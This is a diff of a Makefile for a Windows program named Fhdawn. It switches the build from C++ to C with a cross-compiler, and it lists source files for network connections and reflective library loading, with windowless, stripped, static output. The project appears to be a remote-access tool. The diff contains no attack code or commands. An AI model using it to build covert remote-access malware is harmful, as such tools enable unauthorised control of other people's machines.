@@ -1,12 +1,10 @@
-win:
-	g++ main.cpp system.cpp connect.cpp other.cpp processmonitor.cpp scanner.cpp -o fhdawn.exe -lws2_32 -lpsapi -liphlpapi -static -mwindows
-linux:
-	i686-w64-mingw32-g++ main.cpp system.cpp connect.cpp other.cpp processmonitor.cpp -o fhdawn.exe -lws2_32 -lpsapi -static -liphlpapi -mwindows
 
-make build-win:
-	g++ build.cpp -o builder.exe
-	./builder
+COMPILER 				:=
+ifeq ($(OS),Windows_NT)
+	COMPILER += gcc
+else
+	COMPILER += i686-w64-mingw32-gcc
+endif
 
-make build-linux:
-	i686-w64-mingw32-g++ build.cpp -o builder.exe -static
-	wine builder.exe
+main:
+	$(COMPILER) main.c sys.c connect.c fhdawn.c network.c LoadLibraryR.c GetProcAddressR.c -o Fhdawn.exe -lws2_32 -static -liphlpapi -m32 -mwindows -lpsapi -lwininet -MD -s -O3
